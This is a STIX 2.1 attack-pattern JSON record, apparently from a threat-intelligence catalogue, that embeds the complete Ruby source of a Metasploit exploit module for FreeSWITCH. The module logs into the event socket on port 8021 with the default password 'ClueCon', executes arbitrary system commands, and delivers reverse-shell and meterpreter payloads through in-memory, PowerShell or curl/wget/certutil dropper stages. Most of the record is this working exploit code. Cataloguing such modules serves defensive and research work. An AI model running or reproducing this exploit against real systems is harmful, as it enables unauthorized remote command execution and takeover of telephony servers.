{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60146576-b695-4578-b990-34044cfd54aa",
    "created": "2024-08-14T17:06:54.325039Z",
    "modified": "2024-08-14T17:06:54.325044Z",
    "name": "FreeSWITCH Event Socket Command Execution",
    "description": " This module uses the FreeSWITCH event socket interface to execute system commands using the `system` API command.  The event socket service is enabled by default and listens on TCP port 8021 on the local network interface.  This module has been tested successfully on FreeSWITCH versions:  1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine; 1.8.4~64bit on Ubuntu 19.04 (x64); and 1.10.1~64bit on Windows 7 SP1 (EN) (x64).  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/freeswitch_event_socket_cmd_exec.rb",
            "external_id": "freeswitch_event_socket_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'FreeSWITCH Event Socket Command Execution',\n      'Description'     => %q{\n        This module uses the FreeSWITCH event socket interface\n        to execute system commands using the `system` API command.\n\n        The event socket service is enabled by default and listens\n        on TCP port 8021 on the local network interface.\n\n        This module has been tested successfully on FreeSWITCH versions:\n\n        1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine;\n        1.8.4~64bit on Ubuntu 19.04 (x64); and\n        1.10.1~64bit on Windows 7 SP1 (EN) (x64).\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          => ['bcoles'],\n      'References'      =>\n        [\n          ['CWE', '260'], # default password, configurable in event_socket.conf.xml\n          ['URL', 'https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket']\n        ],\n      'Platform'        => %w[win linux unix bsd],\n      'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Payload'         => {'BadChars' => \"\\x00\\x0a\\x0d\\x27\\x5c\"},\n      'CmdStagerFlavor' => %w[curl wget certutil vbs],\n      'Targets'         =>\n        [\n          ['Unix (In-Memory)',\n            'Platform'       => 'unix',\n            'Arch'           => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},\n            'Type'           => :unix_memory\n          ],\n          ['Linux (Dropper)',\n            'Platform'       => 'linux',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},\n            'Type'           => :linux_dropper\n          ],\n          ['PowerShell (In-Memory)',\n            'Platform'       => 'win',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},\n            'Type'           => :psh_memory\n          ],\n          ['Windows (In-Memory)',\n            'Platform'       => 'win',\n            'Arch'           => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/reverse_powershell'},\n            'Type'           => :win_memory\n          ],\n          ['Windows (Dropper)',\n            'Platform'       => 'win',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},\n            'Type'           => :win_dropper\n          ]\n        ],\n      'Privileged'      => false,\n      'DefaultOptions'  => { 'RPORT' => 8021 },\n      'DisclosureDate'  => '2019-11-03',\n      'DefaultTarget'   => 0))\n    register_options [\n      OptString.new('PASSWORD', [true, 'FreeSWITCH event socket password', 'ClueCon'])\n    ]\n  end\n\n  def check\n    connect\n    banner = sock.get_once.to_s\n    disconnect\n\n    if banner.include?('Access Denied, go away.') || banner.include?('text/rude-rejection')\n      vprint_error 'Access denied by network ACL'\n      return CheckCode::Safe\n    end\n\n    unless banner.include?('Content-Type: auth/request')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def auth(password)\n    sock.put \"auth #{password}\\n\\n\"\n    res = sock.get_once.to_s\n\n    unless res.include? 'Content-Type: command/reply'\n      fail_with Failure::UnexpectedReply, 'Unexpected reply'\n    end\n\n    unless res.include?('Reply-Text: +OK accepted')\n      fail_with Failure::NoAccess, 'Login failed'\n    end\n\n    print_status 'Login success'\n  end\n\n  def execute_command(cmd, opts = {})\n    api_function = opts[:foreground] ? 'system' : 'bg_system'\n\n    sock.put \"api #{api_function} #{cmd}\\n\\n\"\n    res = sock.get_once.to_s\n\n    unless res.include? 'Content-Type: api/response'\n      fail_with Failure::UnexpectedReply, 'Unexpected reply'\n    end\n\n    vprint_status \"Response: #{res}\"\n  end\n\n  def exploit\n    unless check == CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    connect\n    banner = sock.get_once.to_s\n\n    auth(datastore['PASSWORD'])\n\n    print_status \"Sending payload (#{payload.encoded.length} bytes) ...\"\n\n    case target['Type']\n    when :unix_memory\n      if datastore['PAYLOAD'] == 'cmd/unix/generic'\n        execute_command(payload.encoded, foreground: true)\n      else\n        execute_command(payload.encoded)\n      end\n    when :win_memory\n      if datastore['PAYLOAD'] == 'cmd/windows/generic'\n        execute_command(payload.encoded, foreground: true)\n      else\n        execute_command(payload.encoded)\n      end\n    when :psh_memory\n      execute_command(\n        cmd_psh_payload(\n          payload.encoded,\n          payload_instance.arch.first,\n          { :remove_comspec => true, :encode_final_payload => true }\n        )\n      )\n    when :linux_dropper\n      execute_cmdstager(:linemax => 1_500)\n    when :win_dropper\n      execute_cmdstager(:linemax => 1_500)\n    end\n  ensure\n    disconnect unless sock.nil?\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-03",
    "x_mitre_platforms": [
        "win'"
    ]
}